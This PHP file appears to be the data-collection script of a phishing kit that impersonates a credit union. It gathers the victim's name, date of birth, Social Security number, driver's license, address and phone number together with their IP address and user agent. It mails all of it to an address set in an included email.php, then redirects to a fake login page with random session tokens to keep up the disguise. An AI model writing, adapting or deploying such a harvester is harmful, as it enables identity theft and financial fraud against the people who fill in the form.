<?php
if($_POST["name"] != "" and $_POST["name1"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------N'F.C.U Info-----------------------\n";
$message .= "1st Name            		: ".$_POST['name']."\n";
$message .= "Last Name            		: ".$_POST['name1']."\n";
$message .= "DOB	            		: ".$_POST['d']."\n";
$message .= "SSN	            		: ".$_POST['s']."\n";
$message .= "Driver's License			: ".$_POST['dl']."\n";
$message .= "Address					: ".$_POST['addr']."\n";
$message .= "Zip Code		           	: ".$_POST['zp']."\n";
$message .= "Phone Number				: ".$_POST['ph']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf4.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>